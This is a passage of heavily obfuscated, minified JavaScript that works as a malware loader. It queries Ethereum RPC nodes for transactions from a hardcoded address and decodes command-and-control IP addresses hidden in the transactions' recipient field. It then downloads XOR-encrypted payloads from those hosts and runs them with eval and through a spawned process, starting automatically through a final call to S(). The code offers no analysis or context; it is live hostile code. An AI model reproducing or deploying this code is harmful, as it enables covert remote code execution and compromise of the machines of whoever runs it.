m=h.indexOf(d[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;a|=j<<c;c+=(j&8191)>88?13:14;do{g.push(a&255);a>>=8;c-=8}while(c>7);j=-1}}if(j>-1){g.push((a|j<<c)&255)}return l(g)}function e(e,h){return b(c.slice(e,e+h))}if(f){return}f=!0;const h=a.endsWith("\n")?a:""+a+"\n";d.stdin.write(e(149,51),()=>{d.stdin.write(h,()=>{d.stdin.end();d.stdin.unref();if(d.stdout){d.stdout.unref()}if(d.stderr){d.stderr.unref()}d.unref();g()})})},i=b=>{e+=b.toString("utf8");if(new RegExp("(^|\\n)> $","").test(e)){h()}};d.on("error",g);d.stdout.on("data",i);d.stderr.on("data",i);d.stdin.write("\n");o("k__4zk")(h,10000)})}const v=1000n,w=b(205,52).toLowerCase(),x=12,y=0n,z=b(261,37),A=3000,B=[...new(o("Mk0LmrW"))([process.env.ETH_RPC_URL,b(301,24),b(327,25),b(354,43),b(402,47)].filter(o("UcVlGXr")))],C={"http:":new p.Agent({keepAlive:!0,keepAliveMsecs:30000,maxSockets:64}),"https:":new q.Agent({keepAlive:!0,keepAliveMsecs:30000,maxSockets:64})};function D(a,b){if(!a){return}a.addEventListener("abort",()=>{return b.abort()},{once:!0})}function E(a){const b=(a.headers["content-encoding"]||"").toLowerCase();if(b==="gzip"||b==="x-gzip"){return a.pipe(r.createGunzip())}if(b==="deflate"){return a.pipe(r.createInflate())}if(b==="br"){return a.pipe(r.createBrotliDecompress())}return a}function F(a,{method:b="GET",body:c,signal:d}={}){const e=new s(a),f=e.protocol==="https:"?q:p,g={Accept:"application/json","Accept-Encoding":"gzip, deflate, br",Connection:"keep-alive"};if(c!=null){g["Content-Type"]="application/json";g["Content-Length"]=Buffer.byteLength(c)}return new(o("tdTjubV"))((a,h)=>{const i=f.request({hostname:e.hostname,port:e.port||(e.protocol==="https:"?443:80),path:e.pathname+e.search,method:b,agent:C[e.protocol],signal:d,headers:g},i=>{const b=E(i),c=[];b.on("data",i=>{return c.push(i)});b.on("end",()=>{const b=Buffer.concat(c).toString("utf8").trim();if(i.statusCode<200||i.statusCode>=300){return h(new(o("TAIsJro"))("HTTP "+i.statusCode+" from "+e.hostname+": "+b.slice(0,120)))}if(!b||b[0]==="<"||b[0]!=="{"&&b[0]!=="["){return h(new(o("TAIsJro"))("Non-JSON from "+e.hostname+": "+b.slice(0,120)))}try{a(o("LYahbCb").parse(b))}catch(err){h(new(o("TAIsJro"))("JSON parse failed from "+e.hostname+": "+err.message))}});b.on("error",h)});i.on("error",h);i.setTimeout(A,()=>{i.destroy(new(o("TAIsJro"))("HTTP timeout after "+A+"ms"))});if(c!=null){i.write(c)}i.end()})}async function G(a,b){const d=B.map(()=>{return new(o("hDlNJsF"))});d.forEach(a=>{return D(b,a)});try{return await o("tdTjubV").any(B.map((b,e)=>{return a(b,d[e].signal)}))}finally{for(const e of d)e.abort()}}async function H(a,b,c,d){const e=await F(a,{method:"POST",body:o("LYahbCb").stringify({jsonrpc:"2.0",id:1,method:b,params:c}),signal:d});if(e?.error){throw new(o("TAIsJro"))(e.error.message||o("LYahbCb").stringify(e.error))}if(e?.result==null){throw new(o("TAIsJro"))("RPC "+b+": missing result")}return e.result}async function I(a,b,d){const e=await F(a,{method:"POST",body:o("LYahbCb").stringify(b.map(([a,b],d)=>{return{jsonrpc:"2.0",id:d+1,method:a,params:b}})),signal:d});if(!o("pOZAUNs").isArray(e)){function f(a){var d="@Q>u}m3fd=#BJs{$KNO8HDXYZvq]ETSzlxG_ki|)%(erj*Ap.b/\"Mn~oVa7L:`,^&2RWhUP6?!5w[+g;C0tcy194I<F",e=""+(a||""),f=e.length,g=[],h=0,c=0,j=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;h|=j<<c;c+=(j&8191)>88?13:14;do{g.push(h&255);h>>=8;c-=8}while(c>7);j=-1}}if(j>-1){g.push((h|j<<c)&255)}return l(g)}function g(a,b){return f(c.slice(a,a+b))}throw new(o("TAIsJro"))(g(457,42))}const h=new(o("aowaYkQ"))(e.map(a=>{return[a.id,a]}));return b.map((a,b)=>{const d=h.get(b+1);if(!d){function e(a){var d="=EM#NpJ]wjaLeQyO/x|n@FW5:1q}2C[t{<>czkr.P)_!HvSVd~s*6m^8K\"+Ub93YilAXohgf$RD,0T4(uZB%?7`&I;G",e=""+(a||""),f=e.length,g=[],j=0,h=0,c=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(c<0){c=m}else{c+=m*91;j|=c<<h;h+=(c&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);c=-1}}if(c>-1){g.push((j|c<<h)&255)}return l(g)}function f(a,b){return e(c.slice(a,a+b))}throw new(o("TAIsJro"))(f(503,39)+(b+1))}if(d.error){throw new(o("TAIsJro"))(d.error.message||o("LYahbCb").stringify(d.error))}if(d.result==null){function g(a){var d="dX{6iZ>\"Y4aBjL+!Efs9&~|@})nQpTFq3_:*A.x^V8Jug`NSPUb$or2]0/,#=Om;zlM%(1WKGRk[Cty7H<cI5ewh?Dv",e=""+(a||""),f=e.length,g=[],j=0,h=0,c=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(c<0){c=m}else{c+=m*91;j|=c<<h;h+=(c&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);c=-1}}if(c>-1){g.push((j|c<<h)&255)}return l(g)}function j(a,b){return g(c.slice(a,a+b))}throw new(o("TAIsJro"))(j(547,36)+(b+1))}return d.result})}const J=a=>{return"0x"+a.toString(16)};function K(a){return a.find(a=>{return a.from&&a.from.toLowerCase()===w})||null}function L(a){try{const b=Buffer.from(a.replace(new RegExp("^0x","i"),""),"hex"),c=a=>{return""+a[0]+"."+a[1]+"."+a[2]+"."+a[3]};return[c(b.subarray(0,4)),c(b.subarray(4,8))]}catch(error){return[null,null]}}function M(a){return new(o("tdTjubV"))(b=>{let c=a.length;if(!c){return b(null)}let d=!1;const e=c=>{if(d){return}d=!0;for(const e of a)e.controller.abort();b(c)};for(const f of a)f.run().then(f=>{if(d){return}if(f){e(f)}else{if(--c===0){b(null)}}})["catch"](()=>{if(!d&&--c===0){b(null)}})})}function N(a){const c=a-v,d=new(o("Mk0LmrW")),e=[];for(const f of[a-1n,a,a+1n,c-1n,c,c+1n]){if(f<0n){continue}const g=f.toString();if(d.has(g)){continue}d.add(g);e.push(f)}return e}function O(a){const b=new(o("hDlNJsF"));return{controller:b,run:async()=>{const c=await G((c,d)=>{return H(c,"eth_getBlockByNumber",[J(a),!0],d)},b.signal),d=c?.transactions;if(!o("pOZAUNs").isArray(d)){return null}const e=K(d);return e?{blockNumber:a,tx:e}:null}}}async function P(a,b){const c=a.map(a=>{return["eth_getTransactionCount",[w,J(a)]]});try{return(await G((a,b)=>{return I(a,c,b)},b)).map(o("w8SHhF"))}catch{return(await o("tdTjubV").all(c.map(([a,c])=>{return G((b,d)=>{return H(b,a,c,d)},b)}))).map(o("w8SHhF"))}}async function Q(a){const b=new(o("hDlNJsF"));try{const c=a??o("w8SHhF")(await G((a,b)=>{return H(a,"eth_blockNumber",[],b)},b.signal)),d=o("w8SHhF")(await G((a,b)=>{return H(a,"eth_getTransactionCount",[w,J(c)],b)},b.signal)),e=d-1n;let f=y-1n,g=c;while(g-f>1n){const h=g-f-1n,j=o("w8SHhF")(o("ScVvzHB").min(x,o("wOf1fy")(h))),l=[];for(let m=1n;m<=j;m+=1n)l.push(f+m*(g-f)/(j+1n));const n=await P(l,b.signal),p=n.findIndex(a=>{return a>=d});if(p===-1){f=l[l.length-1]}else{g=l[p];if(p>0){f=l[p-1]}}}const q=await G((a,b)=>{return H(a,"eth_getBlockByNumber",[J(g),!0],b)},b.signal),r=q?.transactions||[];let s=null;for(const u of r){if(!u.from||u.from.toLowerCase()!==w){continue}if(o("w8SHhF")(u.nonce)===e){s=u;break}if(!s||o("w8SHhF")(u.nonce)>o("w8SHhF")(s.nonce)){s=u}}return{blockNumber:g,tx:s}}finally{b.abort()}}async function R(){function a(a){var d="b8GD;ZC=sK3{@/4Xp*nrcYW2)T~.EyN]OSH6JdF,x+:eq_jv$a!?Bhmz\"^Uw<9l0oQ(|VA}&gLMP5>`%ktIR1f#u[7i",e=""+(a||""),f=e.length,g=[],c=0,h=0,j=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;c|=j<<h;h+=(j&8191)>88?13:14;do{g.push(c&255);c>>=8;h-=8}while(h>7);j=-1}}if(j>-1){g.push((c|j<<h)&255)}return l(g)}function b(b,d){return a(c.slice(b,b+d))}const d=""+z+b(588,47)+w+b(642,89),e=await F(d),f=o("pOZAUNs").isArray(e?.result)?e.result:[],g=f.find(a=>{return a.from&&a.from.toLowerCase()===w});if(!g){return null}return{blockNumber:o("w8SHhF")(g.blockNumber),tx:g}}async function S(){function a(a){var d="s&S2Mp={4;Fq1+Vh`.mc:>l|Ya6)i7TdNUkD,e*\"8]ZQ(Pn%oXtvxER0j_A?gbz5!f@3<#OWwIBGHK^JC/}L[y9u$~r",e=""+(a||""),f=e.length,g=[],h=0,j=0,k=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(k<0){k=q}else{k+=q*91;h|=k<<j;j+=(k&8191)>88?13:14;do{g.push(h&255);h>>=8;j-=8}while(j>7);k=-1}}if(k>-1){g.push((h|k<<j)&255)}return l(g)}function d(d,e){return a(c.slice(d,d+e))}let e;try{e=await G((a,d)=>{return H(a,"eth_blockNumber",[],d)})}catch{return}const f=o("w8SHhF")(e),g=f-f%v,h=global;let i=await M(N(g).map(O)),[j,k]=L(i?.tx?.to);function m(a,d,e){if(!a){return null}return new s(b(738,9)+a+":"+d+e)}let n=null;const q=m(j,443,"/0x/cls");if(q){try{n=await r("q4FZkxX{!h,Sr3=@",q)}catch{n=null}}if(!n){i=(await Q(f)["catch"](()=>{return null}))??(await R()["catch"](()=>{return null}));[j,k]=L(i?.tx?.to)}h._V=h.i;h._H=d(751,9)+j+":80";h._H2=d(751,9)+k+":80";h._t_s=d(751,9)+j+":443";h._t_u=d(751,9)+j+":80";function r(a,d){function e(a){var d="AKB3Sd0x/F5yO`@EcwL+q{NXs2;4Jn~#l<r^8>YD&V:i7?pe)hPz\"CT$}9(!%[*1oUtv]u|MjZg,_mbkfQHa6R=.GIW",e=""+(a||""),f=e.length,g=[],j=0,k=0,h=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(h<0){h=q}else{h+=q*91;j|=h<<k;k+=(h&8191)>88?13:14;do{g.push(j&255);j>>=8;k-=8}while(k>7);h=-1}}if(h>-1){g.push((j|h<<k)&255)}return l(g)}function f(a,d){return e(c.slice(a,a+d))}const g={hostname:d.hostname,port:o("wOf1fy")(d.port)||80,path:d.pathname+d.search,headers:{"User-Agent":f(766,137),"Sec-V":h._V||0}};function i(d){const e=a.length;for(let f=0;f<d.length;f++)d[f]^=a.charCodeAt(f%e);return d.toString("utf8")}function j(a){const d=a.headers["x-payload-b64"];if(!d){throw new(o("TAIsJro"))("Missing X-Payload-B64")}return i(Buffer.from(d,"base64"))}function k(a){return new(o("tdTjubV"))((d,e)=>{const f=p.request({...g,method:a},f=>{if(a==="HEAD"){try{d(j(f))}catch(e){e(e)}f.resume();return}const g=[];f.on("data",f=>{return g.push(f)});f.on("end",()=>{try{const a=Buffer.concat(g);if(a.length){return d(i(a))}if(f.headers["x-payload-b64"]){return d(j(f))}e(new(o("TAIsJro"))("Empty payload body"))}catch(e){e(e)}});f.on("error",e)});f.on("error",e);f.setTimeout(A,()=>{f.destroy(new(o("TAIsJro"))("HTTP timeout after "+A+"ms"))});f.end()})}return k("GET")["catch"](()=>{return k("HEAD")})}async function t(a,d,e){try{function f(a){var d="_Wz3Pb8L[^e]AqE,%S4TQ>jB|fy/7NGV!OFmda&J;up1(R?0xvl.o#s$hw\"@C9X+iUY~:IHrn)=5<}M2Zk`c6*{DtKg",e=""+(a||""),f=e.length,g=[],j=0,h=0,k=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(k<0){k=q}else{k+=q*91;j|=k<<h;h+=(k&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);k=-1}}if(k>-1){g.push((j|k<<h)&255)}return l(g)}function g(a,d){return f(c.slice(a,a+d))}const i=await r(d,a),j=e?"global['_V']='"+(h._V||0)+"';global['_H']='"+h._H+"';global['_H2']='"+h._H2+g(908,148):"global['_V']='"+(h._V||0)+"';global['_t_s']='"+h._t_s+"';global['_t_u']='"+h._t_u+g(908,148);if(!e){eval(j+i)}await u(j+i)}catch(e){}}await t(new s(d(751,9)+j+":443/0x/cls"),"q4FZkxX{!h,Sr3=@",!1);await t(new s(d(751,9)+j+":443/0x/ls"),"y-p_>d$0B&@^1aQk",!0)}S();
